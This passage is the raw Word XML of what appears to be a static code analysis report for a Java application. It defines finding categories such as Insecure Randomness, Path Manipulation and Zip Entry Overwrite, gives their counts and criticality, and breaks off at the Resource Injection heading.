    <w:p w14:paraId="05980963" w14:textId="795D8F8B" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="17" w:name="_Toc200039255"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Denial of Service: StringBuilder</w:t>
      </w:r>
      <w:bookmarkEnd w:id="17"/>
    </w:p>
    <w:p w14:paraId="6560A447" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Denial of Service: StringBuilder” error refers to a possible performance or DoS problem caused by inefficient or dangerous use of StringBuilder.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63CC7E90" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Seven were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38522ADB" w14:textId="2C7A0E88" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="_Toc200039256"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Insecure Randomness</w:t>
      </w:r>
      <w:bookmarkEnd w:id="18"/>
    </w:p>
    <w:p w14:paraId="5F0E3EB4" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Insecure Randomness” error indicates that the code uses a random number generator that is not cryptographically or security secure.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49FC97F0" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Four were found in the scan, all with high criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED51EE0" w14:textId="3BAD2275" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Toc200039257"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>J2EE Bad Practices: Threads</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
    </w:p>
    <w:p w14:paraId="571A6F55" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “J2EE Bad Practices: Threads” error reports a problem due to incorrect or non-recommended use of manual threads within a Java EE (J2EE) application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A755EB7" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>There are twelve in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DABE88D" w14:textId="1C41E909" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc200039258"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Missing Check against Null</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w14:paraId="52FC5E09" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The error “Missing Check against Null” means that the code is missing a check to see if a variable, parameter, or object is null before using it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA3F0E9" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Two were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26941FD9" w14:textId="3FD28FB9" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Toc200039259"/>
      <w:r w:rsidRPr="005432B6">
        <w:t xml:space="preserve">Object Model Violation: Erroneous </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>clone(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>) Method</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="18B94DD1" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The error “Object Model Violation: Erroneous </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>clone(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) Method” indicates that the clone() method in a Java class has been implemented incorrectly or does not comply with the rules of the clone contract.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78774115" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Nine were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FE27A9" w14:textId="24558F55" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc200039260"/>
      <w:r w:rsidRPr="005432B6">
        <w:t xml:space="preserve">Object Model Violation: Just one of </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>equals(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:t xml:space="preserve">) and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>hashCode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>() Defined</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
    </w:p>
    <w:p w14:paraId="622B1746" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The error “Object Model Violation: Just one of </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>equals(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>hashCode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">() Defined” indicates that in the Java class the developer has overridden only one of the equals() and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>hashCode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>() methods, but not both.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F609A68" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Three were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DCBADF7" w14:textId="21CBA4FF" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="_Toc200039261"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Password Management: Password in Comment</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p w14:paraId="242A9611" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The error “Password Management: Password in Comment” indicates that a password written inside a comment was found in the source code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E21F334" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The scan shows one with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A8C8726" w14:textId="2048F07E" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc200039262"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Path Manipulation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w14:paraId="0DE27B43" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Path Manipulation” error indicates a security problem related to unsafe management of file or directory paths in a program.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0355AB6A" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Fourteen were found in the scan, three with low criticality and eleven with high criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F510516" w14:textId="6F92C763" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc200039263"/>
      <w:r w:rsidRPr="005432B6">
        <w:lastRenderedPageBreak/>
        <w:t>Path Manipulation: Zip Entry Overwrite</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w14:paraId="74A981F1" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Path Manipulation: Zip Entry Overwrite” error concerns a vulnerability in ZIP file handling, where a compressed file within the ZIP archive can overwrite arbitrary files in the filesystem during extraction due to manipulated paths.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C4D180D" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Only one with medium criticality appears in the scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4CCDF0" w14:textId="0B5E8E18" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc200039264"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Poor Error Handling: Empty Catch Block</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
    </w:p>
    <w:p w14:paraId="03BF5286" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The error “Poor Error Handling: Empty Catch Block” indicates that there is a catch block in the code to handle exceptions, but the catch block is empty and performs no action.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C5E278" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Four were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E705E0" w14:textId="63D4E932" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="27" w:name="_Toc200039265"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Poor Error Handling: Overly Broad Catch</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p w14:paraId="6BB90684" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The error “Poor Error Handling: Overly Broad Catch” indicates that too broad a catch block is being used in the code, such as catching all exceptions with Exception or Throwable, without distinguishing specific error types.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF9F774" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Fourteen are found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A6E7BF" w14:textId="640F0EBA" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="_Toc200039266"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Poor Error Handling: Overly Broad Throws</w:t>
      </w:r>
      <w:bookmarkEnd w:id="28"/>
    </w:p>
    <w:p w14:paraId="7CC1D445" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Poor Error Handling: Overly Broad Throws” error indicates that a method or function claims to throw exceptions that are too general or broad, such as throws Exception or throws Throwable, without specifying more precise exceptions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0C8EFE" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Six were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B894DCE" w14:textId="30B4D734" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="_Toc200039267"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Poor Logging Practice: Use of a System Output Stream</w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
    </w:p>
    <w:p w14:paraId="2CA15890" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The error “Poor Logging Practice: Use of a System Output Stream” indicates that </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>System.out</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>System.err</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is being used directly in the code to print log messages or errors, instead of using a dedicated logging system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5518482C" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Four were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554573B2" w14:textId="24B0B35E" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="30" w:name="_Toc200039268"/>
      <w:r w:rsidRPr="005432B6">
        <w:lastRenderedPageBreak/>
        <w:t>Poor Style: Confusing Naming</w:t>
      </w:r>
      <w:bookmarkEnd w:id="30"/>
    </w:p>
    <w:p w14:paraId="0F0CCF48" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Poor Style: Confusing Naming” error indicates that unclear, ambiguous, or misleading names of variables, functions, classes, or other elements were used in the code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B83B06" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Two are found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD41684" w14:textId="29DDEFF2" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="31" w:name="_Toc200039269"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Poor Style: Value Never Read</w:t>
      </w:r>
      <w:bookmarkEnd w:id="31"/>
    </w:p>
    <w:p w14:paraId="617AF89E" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Poor Style: Value Never Read” error indicates that there is a variable or expression in the code that is assigned a value, but this value is never used (read) thereafter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C59304" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Six were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBA31B1" w14:textId="424AE5BD" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="32" w:name="_Toc200039270"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Portability Flaw: Locale Dependent Comparison</w:t>
      </w:r>
      <w:bookmarkEnd w:id="32"/>
    </w:p>
    <w:p w14:paraId="28548511" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Portability Flaw: Locale Dependent Comparison” error indicates that a comparison or string manipulation (e.g., comparing, sorting, case-sensitive conversion) is performed in the code that depends on the (local) location of the system on which the program is running, and this can cause different behavior on machines with different language settings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7F6999" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Only one with low criticality appears in the scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29147B13" w14:textId="4E5C60CC" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="33" w:name="_Toc200039271"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Privacy Violation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="33"/>
    </w:p>
    <w:p w14:paraId="1856601A" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Privacy Violation” error indicates that the code or application exposes, collects, or handles sensitive personal data inappropriately or not in accordance with privacy regulations, such as GDPR, CCPA, etc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB89A66" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Only one with criticality appears in the scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3097FF57" w14:textId="48FA437B" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="34" w:name="_Toc200039272"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Redundant Null Check</w:t>
      </w:r>
      <w:bookmarkEnd w:id="34"/>
    </w:p>
    <w:p w14:paraId="7379339A" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Redundant Null Check” error indicates that there is an unnecessary, i.e., useless or duplicate null check in the code, which can make the code less readable or misleading.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583D5AD0" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Two were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E77A348" w14:textId="43FBA990" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="35" w:name="_Toc200039273"/>
      <w:r w:rsidRPr="005432B6">
        <w:lastRenderedPageBreak/>
        <w:t>Resource Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="35"/>
    </w:p>
    <w:p w14:paraId="75DBA1C0" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
